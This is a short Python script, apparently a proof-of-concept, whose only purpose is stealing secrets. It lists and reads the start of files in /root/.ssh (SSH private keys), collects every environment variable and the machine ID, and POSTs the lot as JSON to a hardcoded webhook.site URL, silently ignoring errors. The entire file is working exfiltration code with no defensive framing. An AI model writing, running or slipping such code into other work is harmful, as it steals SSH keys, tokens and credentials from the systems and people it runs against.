import os
import http.client
import json
from urllib.parse import urlparse

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"

def send_leak(data):
    try:
        url = urlparse(WEBHOOK_URL)
        conn = http.client.HTTPSConnection(url.netloc)
        params = json.dumps(data)
        headers = {"Content-type": "application/json"}
        conn.request("POST", url.path, params, headers)
        conn.getresponse()
    except:
        pass

def run_pure_python_poc():
    # 1. Проверяем, что мы реально можем прочитать
    targets = {
        "ssh_dir": os.listdir("/root/.ssh") if os.path.exists("/root/.ssh") else "NOT_FOUND",
        "env": dict(os.environ),
        "machine_id": open("/etc/machine-id").read() if os.path.exists("/etc/machine-id") else "N/A"
    }

    # 2. Попытка чтения содержимого (если папка .ssh существует)
    if isinstance(targets["ssh_dir"], list):
        for file in targets["ssh_dir"]:
            try:
                path = f"/root/.ssh/{file}"
                with open(path, 'r') as f:
                    targets[f"content_{file}"] = f.read()[:100] # Берем начало ключа
            except:
                targets[f"content_{file}"] = "READ_ERROR"

    # 3. Отправка через встроенный http.client (не требует curl/gcc)
    send_leak(targets)
    print("[+] Report sent using native python")

if __name__ == "__main__":
    run_pure_python_poc()
